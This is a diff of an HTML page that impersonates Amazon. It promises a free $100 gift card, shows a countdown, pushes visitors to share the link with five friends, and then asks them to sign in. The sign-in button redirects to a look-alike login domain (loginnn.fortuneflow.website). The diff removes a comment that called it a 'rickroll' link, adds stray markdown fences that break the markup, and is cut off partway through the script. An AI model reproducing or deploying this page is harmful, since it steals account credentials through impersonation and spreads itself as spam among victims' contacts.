@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -10,747 +11,747 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #232F3E 0%, #FF9900 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
+
+```
+    body {
+        font-family: 'Arial', sans-serif;
+        background: linear-gradient(135deg, #232F3E 0%, #FF9900 100%);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+    
+    .container {
+        background: white;
+        border-radius: 20px;
+        padding: 40px 20px;
+        max-width: 500px;
+        width: 95%;
+        margin: 0 auto;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    @media (max-width: 480px) {
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px 20px;
-            max-width: 500px;
-            width: 95%;
-            margin: 0 auto;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
+            padding: 30px 15px;
+            width: 90%;
         }
-        
-        @media (max-width: 480px) {
-            .container {
-                padding: 30px 15px;
-                width: 90%;
-            }
-        }
-        
-        .badge {
-            position: absolute;
-            top: 20px;
-            right: -35px;
-            background: #FF9900;
-            color: #232F3E;
-            padding: 8px 40px;
-            transform: rotate(45deg);
-            font-weight: bold;
-            font-size: 12px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-        }
-        
+    }
+    
+    .badge {
+        position: absolute;
+        top: 20px;
+        right: -35px;
+        background: #FF9900;
+        color: #232F3E;
+        padding: 8px 40px;
+        transform: rotate(45deg);
+        font-weight: bold;
+        font-size: 12px;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+    
+    .language-selector {
+        position: absolute;
+        top: 15px;
+        left: 15px;
+        background: white;
+        border-radius: 8px;
+        padding: 8px 12px;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        display: flex;
+        gap: 10px;
+        z-index: 10;
+    }
+    
+    @media (max-width: 480px) {
         .language-selector {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            background: white;
-            border-radius: 8px;
-            padding: 8px 12px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            display: flex;
-            gap: 10px;
-            z-index: 10;
+            top: 10px;
+            left: 10px;
+            padding: 5px 8px;
+            gap: 5px;
         }
-        
-        @media (max-width: 480px) {
-            .language-selector {
-                top: 10px;
-                left: 10px;
-                padding: 5px 8px;
-                gap: 5px;
-            }
-        }
-        
+    }
+    
+    .lang-btn {
+        background: none;
+        border: none;
+        padding: 5px 10px;
+        cursor: pointer;
+        font-weight: bold;
+        color: #636e72;
+        transition: all 0.2s;
+        border-radius: 5px;
+        font-size: 14px;
+    }
+    
+    @media (max-width: 480px) {
         .lang-btn {
-            background: none;
-            border: none;
-            padding: 5px 10px;
-            cursor: pointer;
-            font-weight: bold;
-            color: #636e72;
-            transition: all 0.2s;
-            border-radius: 5px;
-            font-size: 14px;
+            padding: 4px 8px;
+            font-size: 12px;
         }
-        
-        @media (max-width: 480px) {
-            .lang-btn {
-                padding: 4px 8px;
-                font-size: 12px;
-            }
-        }
-        
-        .lang-btn:hover {
-            background: #f0f0f0;
-        }
-        
-        .lang-btn.active {
-            background: #FF9900;
-            color: white;
-        }
-        
-        .logo {
-            width: 120px;
-            margin-bottom: 20px;
-        }
-        
+    }
+    
+    .lang-btn:hover {
+        background: #f0f0f0;
+    }
+    
+    .lang-btn.active {
+        background: #FF9900;
+        color: white;
+    }
+    
+    .logo {
+        width: 120px;
+        margin-bottom: 20px;
+    }
+    
+    .giftcard-image {
+        width: 100%;
+        max-width: 320px;
+        height: 200px;
+        margin: 20px auto;
+        background: linear-gradient(135deg, #232F3E 0%, #37475A 100%);
+        border-radius: 15px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        padding: 20px;
+        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
+        position: relative;
+        overflow: hidden;
+        border: 2px solid #FF9900;
+    }
+    
+    @media (max-width: 480px) {
         .giftcard-image {
-            width: 100%;
-            max-width: 320px;
-            height: 200px;
-            margin: 20px auto;
-            background: linear-gradient(135deg, #232F3E 0%, #37475A 100%);
-            border-radius: 15px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            padding: 20px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
-            position: relative;
-            overflow: hidden;
-            border: 2px solid #FF9900;
+            max-width: 280px;
+            height: 175px;
+            padding: 15px;
         }
-        
-        @media (max-width: 480px) {
-            .giftcard-image {
-                max-width: 280px;
-                height: 175px;
-                padding: 15px;
-            }
-        }
-        
-        .giftcard-image::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,153,0,0.15), transparent);
-            animation: shine 4s infinite;
-        }
-        
-        @keyframes shine {
-            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
-        }
-        
-        .giftcard-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            z-index: 1;
-        }
-        
+    }
+    
+    .giftcard-image::before {
+        content: '';
+        position: absolute;
+        top: -50%;
+        right: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(45deg, transparent, rgba(255,153,0,0.15), transparent);
+        animation: shine 4s infinite;
+    }
+    
+    @keyframes shine {
+        0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+        100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+    }
+    
+    .giftcard-top {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        z-index: 1;
+    }
+    
+    .giftcard-logo {
+        width: 80px;
+        filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+    }
+    
+    @media (max-width: 480px) {
         .giftcard-logo {
-            width: 80px;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+            width: 60px;
         }
-        
-        @media (max-width: 480px) {
-            .giftcard-logo {
-                width: 60px;
-            }
-        }
-        
-        .giftcard-type {
-            background: #FF9900;
-            color: #232F3E;
-            padding: 5px 12px;
-            border-radius: 5px;
-            font-size: 12px;
-            font-weight: bold;
-            box-shadow: 0 2px 8px rgba(255,153,0,0.4);
-        }
-        
+    }
+    
+    .giftcard-type {
+        background: #FF9900;
+        color: #232F3E;
+        padding: 5px 12px;
+        border-radius: 5px;
+        font-size: 12px;
+        font-weight: bold;
+        box-shadow: 0 2px 8px rgba(255,153,0,0.4);
+    }
+    
+    .giftcard-amount {
+        font-size: 64px;
+        font-weight: bold;
+        color: #FF9900;
+        text-shadow: 0 4px 8px rgba(0,0,0,0.5), 0 0 20px rgba(255,153,0,0.3);
+        z-index: 1;
+        letter-spacing: -2px;
+        text-align: left;
+    }
+    
+    @media (max-width: 480px) {
         .giftcard-amount {
-            font-size: 64px;
-            font-weight: bold;
-            color: #FF9900;
-            text-shadow: 0 4px 8px rgba(0,0,0,0.5), 0 0 20px rgba(255,153,0,0.3);
-            z-index: 1;
-            letter-spacing: -2px;
-            text-align: left;
+            font-size: 52px;
         }
-        
-        @media (max-width: 480px) {
-            .giftcard-amount {
-                font-size: 52px;
-            }
-        }
-        
-        .giftcard-bottom {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-            z-index: 1;
-        }
-        
-        .giftcard-label {
-            font-size: 14px;
-            color: #FFFFFF;
-            font-weight: bold;
-            z-index: 1;
-            opacity: 0.9;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .giftcard-code {
-            font-family: 'Courier New', monospace;
-            font-size: 10px;
-            color: #999;
-            letter-spacing: 1px;
-        }
-        
+    }
+    
+    .giftcard-bottom {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-end;
+        z-index: 1;
+    }
+    
+    .giftcard-label {
+        font-size: 14px;
+        color: #FFFFFF;
+        font-weight: bold;
+        z-index: 1;
+        opacity: 0.9;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    
+    .giftcard-code {
+        font-family: 'Courier New', monospace;
+        font-size: 10px;
+        color: #999;
+        letter-spacing: 1px;
+    }
+    
+    h1 {
+        color: #232F3E;
+        font-size: 32px;
+        margin-bottom: 10px;
+        animation: pulse 2s infinite;
+    }
+    
+    @media (max-width: 480px) {
         h1 {
-            color: #232F3E;
-            font-size: 32px;
-            margin-bottom: 10px;
-            animation: pulse 2s infinite;
+            font-size: 24px;
         }
-        
-        @media (max-width: 480px) {
-            h1 {
-                font-size: 24px;
-            }
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        
-        .subtitle {
-            color: #FF9900;
-            font-size: 18px;
-            margin-bottom: 30px;
-            font-weight: bold;
-        }
-        
-        .timer {
-            background: #FFE5CC;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-size: 20px;
-            font-weight: bold;
-            color: #232F3E;
-            border: 2px solid #FF9900;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 30px;
-            background: #ecf0f1;
-            border-radius: 15px;
-            overflow: hidden;
-            margin: 30px 0;
-            position: relative;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #FF9900, #FFB84D);
-            width: 0%;
-            transition: width 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-        }
-        
-        .requirement {
-            background: #232F3E;
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-size: 18px;
-        }
-        
-        .share-buttons {
-            margin: 20px 0;
-        }
-        
-        .share-btn {
-            width: 100%;
-            padding: 20px;
-            border: none;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            color: white;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        }
-        
-        .share-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-        
-        .share-btn:active {
-            transform: translateY(0);
-        }
-        
-        .claim-btn {
-            width: 100%;
-            padding: 20px;
-            background: #999;
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: not-allowed;
-            opacity: 0.5;
-            margin-top: 20px;
-            transition: all 0.3s;
-        }
-        
-        .claim-btn.active {
-            cursor: pointer;
-            opacity: 1;
-            background: #FF9900;
-            animation: glow 2s infinite;
-        }
-        
-        @keyframes glow {
-            0%, 100% { box-shadow: 0 0 20px rgba(255, 153, 0, 0.5); }
-            50% { box-shadow: 0 0 30px rgba(255, 153, 0, 0.8); }
-        }
-        
-        .share-count {
-            font-size: 48px;
-            font-weight: bold;
-            color: #FF9900;
-            margin: 10px 0;
-        }
-        
-        .spinner {
-            display: none;
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #FF9900;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+    }
+    
+    @keyframes pulse {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+    }
+    
+    .subtitle {
+        color: #FF9900;
+        font-size: 18px;
+        margin-bottom: 30px;
+        font-weight: bold;
+    }
+    
+    .timer {
+        background: #FFE5CC;
+        padding: 15px;
+        border-radius: 10px;
+        margin: 20px 0;
+        font-size: 20px;
+        font-weight: bold;
+        color: #232F3E;
+        border: 2px solid #FF9900;
+    }
+    
+    .progress-bar {
+        width: 100%;
+        height: 30px;
+        background: #ecf0f1;
+        border-radius: 15px;
+        overflow: hidden;
+        margin: 30px 0;
+        position: relative;
+    }
+    
+    .progress-fill {
+        height: 100%;
+        background: linear-gradient(90deg, #FF9900, #FFB84D);
+        width: 0%;
+        transition: width 0.3s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: bold;
+    }
+    
+    .requirement {
+        background: #232F3E;
+        color: white;
+        padding: 20px;
+        border-radius: 10px;
+        margin: 20px 0;
+        font-size: 18px;
+    }
+    
+    .share-buttons {
+        margin: 20px 0;
+    }
+    
+    .share-btn {
+        width: 100%;
+        padding: 20px;
+        border: none;
+        border-radius: 10px;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: transform 0.2s, box-shadow 0.2s;
+        color: white;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    }
+    
+    .share-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    }
+    
+    .share-btn:active {
+        transform: translateY(0);
+    }
+    
+    .claim-btn {
+        width: 100%;
+        padding: 20px;
+        background: #999;
+        border: none;
+        border-radius: 10px;
+        color: white;
+        font-size: 20px;
+        font-weight: bold;
+        cursor: not-allowed;
+        opacity: 0.5;
+        margin-top: 20px;
+        transition: all 0.3s;
+    }
+    
+    .claim-btn.active {
+        cursor: pointer;
+        opacity: 1;
+        background: #FF9900;
+        animation: glow 2s infinite;
+    }
+    
+    @keyframes glow {
+        0%, 100% { box-shadow: 0 0 20px rgba(255, 153, 0, 0.5); }
+        50% { box-shadow: 0 0 30px rgba(255, 153, 0, 0.8); }
+    }
+    
+    .share-count {
+        font-size: 48px;
+        font-weight: bold;
+        color: #FF9900;
+        margin: 10px 0;
+    }
+    
+    .spinner {
+        display: none;
+        width: 50px;
+        height: 50px;
+        border: 5px solid #f3f3f3;
+        border-top: 5px solid #FF9900;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 20px auto;
+    }
+    
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
 
-        /* Login Page Styles */
-        .login-page {
-            display: none;
-        }
+    .login-page {
+        display: none;
+    }
 
-        .login-page.show {
-            display: block;
-        }
+    .login-page.show {
+        display: block;
+    }
 
-        .main-page.hide {
-            display: none;
-        }
+    .main-page.hide {
+        display: none;
+    }
 
-        .congrats-banner {
-            background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);
-            color: white;
-            padding: 30px 20px;
-            border-radius: 15px;
-            margin-bottom: 30px;
-            box-shadow: 0 10px 30px rgba(0, 184, 148, 0.3);
-        }
+    .congrats-banner {
+        background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);
+        color: white;
+        padding: 30px 20px;
+        border-radius: 15px;
+        margin-bottom: 30px;
+        box-shadow: 0 10px 30px rgba(0, 184, 148, 0.3);
+    }
 
+    .congrats-banner h2 {
+        font-size: 28px;
+        margin-bottom: 10px;
+    }
+
+    @media (max-width: 480px) {
         .congrats-banner h2 {
-            font-size: 28px;
-            margin-bottom: 10px;
+            font-size: 22px;
         }
+    }
 
-        @media (max-width: 480px) {
-            .congrats-banner h2 {
-                font-size: 22px;
-            }
-        }
+    .congrats-banner p {
+        font-size: 16px;
+        opacity: 0.95;
+    }
 
-        .congrats-banner p {
-            font-size: 16px;
-            opacity: 0.95;
-        }
+    .reward-display {
+        background: #f8f9fa;
+        padding: 20px;
+        border-radius: 10px;
+        margin: 20px 0;
+        border: 2px solid #FF9900;
+    }
 
-        .reward-display {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border: 2px solid #FF9900;
-        }
+    .reward-amount {
+        font-size: 48px;
+        font-weight: bold;
+        color: #FF9900;
+        margin: 10px 0;
+    }
 
-        .reward-amount {
-            font-size: 48px;
-            font-weight: bold;
-            color: #FF9900;
-            margin: 10px 0;
-        }
+    .reward-text {
+        color: #232F3E;
+        font-size: 18px;
+        font-weight: bold;
+    }
 
-        .reward-text {
-            color: #232F3E;
-            font-size: 18px;
-            font-weight: bold;
-        }
+    .login-instructions {
+        background: #FFE5CC;
+        padding: 15px;
+        border-radius: 10px;
+        margin: 20px 0;
+        color: #232F3E;
+        font-size: 14px;
+        border-left: 4px solid #FF9900;
+        text-align: left;
+    }
 
-        .login-instructions {
-            background: #FFE5CC;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            color: #232F3E;
-            font-size: 14px;
-            border-left: 4px solid #FF9900;
-            text-align: left;
-        }
+    .signin-btn {
+        width: 100%;
+        padding: 20px;
+        background: #FF9900;
+        border: none;
+        border-radius: 10px;
+        color: white;
+        font-size: 20px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 20px;
+        transition: all 0.3s;
+        box-shadow: 0 5px 15px rgba(255, 153, 0, 0.3);
+    }
 
-        .signin-btn {
-            width: 100%;
-            padding: 20px;
-            background: #FF9900;
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.3);
-        }
+    .signin-btn:hover {
+        background: #232F3E;
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(255, 153, 0, 0.4);
+    }
 
-        .signin-btn:hover {
-            background: #232F3E;
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(255, 153, 0, 0.4);
-        }
+    .signin-btn:active {
+        transform: translateY(0);
+    }
 
-        .signin-btn:active {
-            transform: translateY(0);
-        }
+    .security-badge {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-top: 20px;
+        color: #666;
+        font-size: 12px;
+    }
 
-        .security-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-            color: #666;
-            font-size: 12px;
-        }
+    .security-badge::before {
+        content: "🔒";
+        font-size: 16px;
+    }
+</style>
+```
 
-        .security-badge::before {
-            content: "🔒";
-            font-size: 16px;
-        }
-    </style>
 </head>
 <body>
-    <!-- MAIN GIFT CARD PAGE -->
     <div class="container main-page" id="mainPage">
         <div class="language-selector">
             <button class="lang-btn active" onclick="setLanguage('en')" id="langEn">🇺🇸 English</button>
             <button class="lang-btn" onclick="setLanguage('es')" id="langEs">🇪🇸 Español</button>
         </div>
-        
-        <div class="badge" id="badge">LIMITED</div>
-        
-        <svg class="logo" viewBox="0 0 603 182" xmlns="http://www.w3.org/2000/svg">
-            <path fill="#FF9900" d="M374.3 141.5c-53.7 39.7-131.6 60.8-198.7 60.8-94 0-178.8-34.8-242.8-92.6-5-4.5-.5-10.7 5.5-7.2 69 40.2 154.2 64.4 242.2 64.4 59.4 0 124.7-12.3 184.8-37.8 9-3.8 16.5 5.9 9 12.4z"/>
-            <path fill="#FF9900" d="M387.5 126.2c-6.9-8.8-45.4-4.2-62.7-2.1-5.3.6-6.1-4-1.3-7.4 30.7-21.6 81-15.4 86.9-8.1 5.8 7.3-.6 58-30.5 82.2-4.6 3.7-8.9 1.7-6.9-3.2 6.5-16.4 21.1-53 14.5-61.4z"/>
-        </svg>
-        
-        <h1 id="mainTitle">🎉 FREE GIFT CARD! 🎉</h1>
-        
-        <div class="giftcard-image">
-            <div class="giftcard-top">
-                <svg class="giftcard-logo" viewBox="0 0 603 182" xmlns="http://www.w3.org/2000/svg">
-                    <path fill="#FF9900" d="M374.3 141.5c-53.7 39.7-131.6 60.8-198.7 60.8-94 0-178.8-34.8-242.8-92.6-5-4.5-.5-10.7 5.5-7.2 69 40.2 154.2 64.4 242.2 64.4 59.4 0 124.7-12.3 184.8-37.8 9-3.8 16.5 5.9 9 12.4z"/>
-                    <path fill="#FF9900" d="M387.5 126.2c-6.9-8.8-45.4-4.2-62.7-2.1-5.3.6-6.1-4-1.3-7.4 30.7-21.6 81-15.4 86.9-8.1 5.8 7.3-.6 58-30.5 82.2-4.6 3.7-8.9 1.7-6.9-3.2 6.5-16.4 21.1-53 14.5-61.4z"/>
-                </svg>
-                <div class="giftcard-type" id="giftcardType">GIFT CARD</div>
-            </div>
-            <div class="giftcard-amount">$100</div>
-            <div class="giftcard-bottom">
-                <div class="giftcard-label" id="giftcardLabel">DIGITAL CODE</div>
-                <div class="giftcard-code">XXXX-XXXXXX-XXXX</div>
-            </div>
-        </div>
-        
-        <p class="subtitle" id="subtitle">Amazon Gift Card - Yours FREE!</p>
-        
-        <div class="timer">⏰ <span id="timerText">Hurry! Offer expires in:</span> <span id="countdown">10:00</span></div>
-        
-        <div class="requirement" id="requirement">
-            📢 <span id="shareText">Share with 5 friends to unlock your gift card!</span>
-        </div>
-        
-        <div class="progress-bar">
-            <div class="progress-fill" id="progress">0/5</div>
-        </div>
-        
-        <div class="share-count" id="shareCount">0/5</div>
-        
-        <div class="share-buttons">
-            <button class="share-btn" onclick="shareLink()" id="shareBtn">
-                <span id="shareBtnText">📤 Share to Unlock</span>
-            </button>
-        </div>
-        
-        <button class="claim-btn" id="claimBtn" onclick="attemptClaim()">
-            <span id="claimBtnText">🔒 CLAIM YOUR $100 GIFT CARD</span>
-        </button>
-        
-        <div class="spinner" id="spinner"></div>
-    </div>
 
-    <!-- LOGIN PAGE -->
-    <div class="container login-page" id="loginPage">
-        <div class="congrats-banner">
-            <h2 id="congratsTitle">🎉 Congratulations! 🎉</h2>
-            <p id="congratsSubtitle">You've successfully unlocked your reward!</p>
+```
+    <div class="badge" id="badge">LIMITED</div>
+    
+    <svg class="logo" viewBox="0 0 603 182" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#FF9900" d="M374.3 141.5c-53.7 39.7-131.6 60.8-198.7 60.8-94 0-178.8-34.8-242.8-92.6-5-4.5-.5-10.7 5.5-7.2 69 40.2 154.2 64.4 242.2 64.4 59.4 0 124.7-12.3 184.8-37.8 9-3.8 16.5 5.9 9 12.4z"/>
+        <path fill="#FF9900" d="M387.5 126.2c-6.9-8.8-45.4-4.2-62.7-2.1-5.3.6-6.1-4-1.3-7.4 30.7-21.6 81-15.4 86.9-8.1 5.8 7.3-.6 58-30.5 82.2-4.6 3.7-8.9 1.7-6.9-3.2 6.5-16.4 21.1-53 14.5-61.4z"/>
+    </svg>
+    
+    <h1 id="mainTitle">🎉 FREE GIFT CARD! 🎉</h1>
+    
+    <div class="giftcard-image">
+        <div class="giftcard-top">
+            <svg class="giftcard-logo" viewBox="0 0 603 182" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#FF9900" d="M374.3 141.5c-53.7 39.7-131.6 60.8-198.7 60.8-94 0-178.8-34.8-242.8-92.6-5-4.5-.5-10.7 5.5-7.2 69 40.2 154.2 64.4 242.2 64.4 59.4 0 124.7-12.3 184.8-37.8 9-3.8 16.5 5.9 9 12.4z"/>
+                <path fill="#FF9900" d="M387.5 126.2c-6.9-8.8-45.4-4.2-62.7-2.1-5.3.6-6.1-4-1.3-7.4 30.7-21.6 81-15.4 86.9-8.1 5.8 7.3-.6 58-30.5 82.2-4.6 3.7-8.9 1.7-6.9-3.2 6.5-16.4 21.1-53 14.5-61.4z"/>
+            </svg>
+            <div class="giftcard-type" id="giftcardType">GIFT CARD</div>
         </div>
-
-        <div class="reward-display">
-            <div class="reward-text" id="rewardText">Your Amazon Gift Card</div>
-            <div class="reward-amount">$100</div>
-        </div>
-
-        <div class="login-instructions">
-            <p id="instructionText">Please sign in to your Amazon account to claim your $100 gift card. This is required to verify your identity and deliver your reward.</p>
-        </div>
-
-        <button class="signin-btn" onclick="redirectToLogin()">
-            <span id="signinBtnText">Sign In to Claim Reward</span>
-        </button>
-
-        <div class="security-badge">
-            <span id="securityText">Secure Amazon Authentication</span>
+        <div class="giftcard-amount">$100</div>
+        <div class="giftcard-bottom">
+            <div class="giftcard-label" id="giftcardLabel">DIGITAL CODE</div>
+            <div class="giftcard-code">XXXX-XXXXXX-XXXX</div>
         </div>
     </div>
+    
+    <p class="subtitle" id="subtitle">Amazon Gift Card - Yours FREE!</p>
+    
+    <div class="timer">⏰ <span id="timerText">Hurry! Offer expires in:</span> <span id="countdown">10:00</span></div>
+    
+    <div class="requirement" id="requirement">
+        📢 <span id="shareText">Share with 5 friends to unlock your gift card!</span>
+    </div>
+    
+    <div class="progress-bar">
+        <div class="progress-fill" id="progress">0/5</div>
+    </div>
+    
+    <div class="share-count" id="shareCount">0/5</div>
+    
+    <div class="share-buttons">
+        <button class="share-btn" onclick="shareLink()" id="shareBtn">
+            <span id="shareBtnText">📤 Share to Unlock</span>
+        </button>
+    </div>
+    
+    <button class="claim-btn" id="claimBtn" onclick="attemptClaim()">
+        <span id="claimBtnText">🔒 CLAIM YOUR $100 GIFT CARD</span>
+    </button>
+    
+    <div class="spinner" id="spinner"></div>
+</div>
 
-    <script>
-        // ⬇️⬇️⬇️ PUT YOUR RICKROLL LINK HERE ⬇️⬇️⬇️
-        const REDIRECT_URL = 'https://www.loginnn.fortuneflow.website/DpYtcrnW';
-        // ⬆️⬆️⬆️ PUT YOUR RICKROLL LINK HERE ⬆️⬆️⬆️
-        
-        let shareCount = 0;
-        let timeLeft = 600;
-        let shareTimer = null;
-        let hasShared = false;
-        let currentLang = 'en';
-        
-        const translations = {
-            en: {
-                badge: 'LIMITED',
-                mainTitle: '🎉 FREE GIFT CARD! 🎉',
-                giftcardLabel: 'DIGITAL CODE',
-                giftcardType: 'GIFT CARD',
-                subtitle: 'Amazon Gift Card - Yours FREE!',
-                timerText: 'Hurry! Offer expires in:',
-                shareText: 'Share with 5 friends to unlock your gift card!',
-                shareBtnText: '📤 Share to Unlock',
-                shareBtnVerifying: '⏳ Verifying share...',
-                shareBtnVerified: '✅ Share Verified!',
-                claimBtnText: '🔒 CLAIM YOUR $100 GIFT CARD',
-                claimBtnActive: '🎁 CLAIM YOUR $100 GIFT CARD NOW!',
-                claimBtnProcessing: 'Processing...',
-                shareMessage: 'Look! I found this free $100 Amazon gift card! Claim yours now before it expires! 🎁\n\n',
-                congratsTitle: '🎉 Congratulations! 🎉',
-                congratsSubtitle: "You've successfully unlocked your reward!",
-                rewardText: 'Your Amazon Gift Card',
-                instructionText: 'Please sign in to your Amazon account to claim your $100 gift card. This is required to verify your identity and deliver your reward.',
-                signinBtnText: 'Sign In to Claim Reward',
-                securityText: 'Secure Amazon Authentication'
-            },
-            es: {
-                badge: 'LIMITADO',
-                mainTitle: '🎉 ¡TARJETA REGALO GRATIS! 🎉',
-                giftcardLabel: 'CÓDIGO DIGITAL',
-                giftcardType: 'TARJETA REGALO',
-                subtitle: '¡Tarjeta Regalo de Amazon - Tuya GRATIS!',
-                timerText: '¡Apúrate! La oferta expira en:',
-                shareText: '¡Comparte con 5 amigos para desbloquear tu tarjeta regalo!',
-                shareBtnText: '📤 Compartir para Desbloquear',
-                shareBtnVerifying: '⏳ Verificando...',
-                shareBtnVerified: '✅ ¡Compartido Verificado!',
-                claimBtnText: '🔒 RECLAMA TU TARJETA DE $100',
-                claimBtnActive: '🎁 ¡RECLAMA TU TARJETA DE $100 AHORA!',
-                claimBtnProcessing: 'Procesando...',
-                shareMessage: '¡Mira! ¡Encontré esta tarjeta de regalo gratis de Amazon de $100! ¡Reclama la tuya antes de que expire! 🎁\n\n',
-                congratsTitle: '🎉 ¡Felicidades! 🎉',
-                congratsSubtitle: '¡Has desbloqueado tu recompensa exitosamente!',
-                rewardText: 'Tu Tarjeta Regalo de Amazon',
-                instructionText: 'Por favor, inicia sesión en tu cuenta de Amazon para reclamar tu tarjeta de regalo de $100. Esto es necesario para verificar tu identidad y entregar tu recompensa.',
-                signinBtnText: 'Iniciar Sesión para Reclamar Recompensa',
-                securityText: 'Autenticación Segura de Amazon'
-            }
-        };
-        
-        function setLanguage(lang) {
-            currentLang = lang;
-            
-            document.getElementById('langEn').classList.remove('active');
-            document.getElementById('langEs').classList.remove('active');
-            document.getElementById('lang' + lang.charAt(0).toUpperCase() + lang.slice(1)).classList.add('active');
-            
-            const t = translations[lang];
-            document.getElementById('badge').textContent = t.badge;
-            document.getElementById('mainTitle').textContent = t.mainTitle;
-            document.getElementById('giftcardLabel').textContent = t.giftcardLabel;
-            document.getElementById('giftcardType').textContent = t.giftcardType;
-            document.getElementById('subtitle').textContent = t.subtitle;
-            document.getElementById('timerText').textContent = t.timerText;
-            document.getElementById('shareText').textContent = t.shareText;
-            
-            if (!hasShared) {
-                document.getElementById('shareBtnText').textContent = t.shareBtnText;
-            }
-            if (shareCount < 5) {
-                document.getElementById('claimBtnText').textContent = t.claimBtnText;
-            }
+<div class="container login-page" id="loginPage">
+    <div class="congrats-banner">
+        <h2 id="congratsTitle">🎉 Congratulations! 🎉</h2>
+        <p id="congratsSubtitle">You've successfully unlocked your reward!</p>
+    </div>
+
+    <div class="reward-display">
+        <div class="reward-text" id="rewardText">Your Amazon Gift Card</div>
+        <div class="reward-amount">$100</div>
+    </div>
+
+    <div class="login-instructions">
+        <p id="instructionText">Please sign in to your Amazon account to claim your $100 gift card. This is required to verify your identity and deliver your reward.</p>
+    </div>
+
+    <button class="signin-btn" onclick="redirectToLogin()">
+        <span id="signinBtnText">Sign In to Claim Reward</span>
+    </button>
+
+    <div class="security-badge">
+        <span id="securityText">Secure Amazon Authentication</span>
+    </div>
+</div>
+
+<script>
+    const REDIRECT_URL = 'https://www.loginnn.fortuneflow.website/DpYtcrnW';
+    
+    let shareCount = 0;
+    let timeLeft = 600;
+    let shareTimer = null;
+    let hasShared = false;
+    let currentLang = 'en';
+    
+    const translations = {
+        en: {
+            badge: 'LIMITED',
+            mainTitle: '🎉 FREE GIFT CARD! 🎉',
